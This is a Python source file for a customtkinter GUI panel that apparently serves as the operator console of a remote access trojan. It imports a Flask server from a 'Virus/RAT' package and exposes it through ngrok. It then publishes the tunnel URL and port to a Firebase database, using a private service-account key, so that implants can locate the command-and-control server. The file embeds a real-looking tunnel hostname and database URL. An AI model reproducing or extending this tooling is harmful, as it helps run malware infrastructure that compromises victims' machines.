import customtkinter as ctk
import webbrowser
import firebase_admin
from firebase_admin import credentials, db
import subprocess
import threading
import time
import requests

from Virus.RAT.Python_HTML_Server.server import run_flask

firebase_initialized = False  # Флаг, чтобы инициализировать Firebase один раз

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    global firebase_initialized

    main_frame = ctk.CTkFrame(parent_frame)
    main_frame.pack(expand=True, fill="both", padx=20, pady=20)

    left_frame = ctk.CTkFrame(main_frame)
    left_frame.pack(side="left", fill="both", padx=10, pady=10)

    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="right", expand=True, fill="both", padx=10, pady=10)

    info_label = ctk.CTkLabel(
        left_frame,
        text="Will open the browser, you need to start the server on port 12345",
        font=ctk.CTkFont(size=14),
        wraplength=250
    )
    info_label.pack(pady=(10, 20))

    login_and_open_btn = ctk.CTkButton(left_frame, text="Войти", command=lambda: open_browser())
    login_and_open_btn.pack(pady=10)

    start_ngrok_server = ctk.CTkButton(left_frame, text="Start ngrok server", command=lambda: start_ngrok())
    start_ngrok_server.pack(pady=10)
    # Label для отображения полученной ngrok-ссылки
    ngrok_url_label = ctk.CTkLabel(right_frame, text="", text_color="green", cursor="hand2")
    ngrok_url_label.pack(pady=5)

    # Кнопка для вставки ссылки в поле
    def insert_ngrok_url():
        ngrok_url_entry.delete(0, "end")
        ngrok_url_entry.insert(0, ngrok_url_label.cget("text"))

    def update_ngrok_url(public_url):
        ngrok_url_label.configure(text=public_url)
        ngrok_url_entry.delete(0, "end")
        ngrok_url_entry.insert(0, public_url)


    insert_button = ctk.CTkButton(right_frame, text="Вставить ngrok url", command=lambda: insert_ngrok_url())
    insert_button.pack(pady=5)

    port_frame = ctk.CTkFrame(right_frame)
    port_frame.pack(pady=5, fill="x")

    port_entry = ctk.CTkEntry(port_frame, placeholder_text="Enter port")
    port_entry.pack(side="left", expand=True, fill="x")

    def insert_ngrok_url_to_port():
        try:
            clipboard_text = parent_frame.clipboard_get()
            port_entry.delete(0, "end")
            port_entry.insert(0, clipboard_text)
        except Exception as e:
            print(f"[ERROR] Не удалось получить текст из буфера обмена: {e}")

    insert_port_btn = ctk.CTkButton(port_frame, text="Вставить Port", width=80, command=insert_ngrok_url_to_port)
    insert_port_btn.pack(side="left", padx=(5,0))

    ngrok_url_entry = ctk.CTkEntry(right_frame, placeholder_text="Enter ngrok url")
    ngrok_url_entry.pack(pady=5)

    save_data_btn = ctk.CTkButton(right_frame, text="Save data", command=lambda: save_data_to_firebase())
    save_data_btn.pack(pady=10)

    if go_back_callback:
        back_btn = ctk.CTkButton(left_frame, text="Назад", command=go_back_callback)
        back_btn.pack(side="bottom", pady=10)

    def save_data_to_firebase():
        global firebase_initialized  # используем глобальную переменную

        if not firebase_initialized:
            cred = credentials.Certificate('Virus/RAT/Shhhhhh/ngrokservers-2e669-firebase-adminsdk-fbsvc-3e6b68fbd8.json')
            firebase_admin.initialize_app(cred, {
                'databaseURL': 'https://ngrokservers-2e669-default-rtdb.europe-west1.firebasedatabase.app/'
            })
            firebase_initialized = True

        server_data = {
            'status': 'online',
            'ngrok_url': "btd2u35hv.localto.net"
        }

        https_url = ngrok_url_entry.get().strip()
        port = port_entry.get().strip()

        if https_url:
            server_data['https_url'] = https_url
        if port:
            server_data['ngrok_port'] = port

        ref = db.reference('serverInfo')
        ref.set(server_data)


    def start_ngrok():
        def run_ngrok():
            print("[INFO] Запуск Flask-сервера...")
            threading.Thread(target=run_flask, daemon=True).start()

            print("[INFO] Запуск ngrok на порту 5000...")
            subprocess.Popen(["ngrok", "http", "5000"])
            
            print("[INFO] Ожидание запуска ngrok и API (http://127.0.0.1:4040)...")
            time.sleep(5)  # Лучше дать время на запуск

            # Попробуем до 10 раз получить публичную ссылку
            for attempt in range(10):
                try:
                    print(f"[DEBUG] Попытка {attempt + 1}: Получение туннелей...")
                    response = requests.get("http://127.0.0.1:4040/api/tunnels")
                    tunnels = response.json().get("tunnels", [])

                    for tunnel in tunnels:
                        proto = tunnel.get("proto")
                        public_url = tunnel.get("public_url")
                        print(f"[DEBUG] Найден туннель: proto={proto}, url={public_url}")
                        
                        if proto == "https":
                            print(f"[SUCCESS] Получен публичный URL: {public_url}")
                            parent_frame.after(0, lambda: update_ngrok_url(public_url))
                            return
                except Exception as e:
                    print(f"[ERROR] Ошибка при запросе API ngrok: {e}")

                time.sleep(1)  # Ждём перед следующей попыткой

            print("[FAIL] Не удалось получить ссылку от ngrok.")
        
        threading.Thread(target=run_ngrok, daemon=True).start()

    def open_browser():
        url = 'https://localtonet.com/tunnel/tcpudp'
        webbrowser.open(url)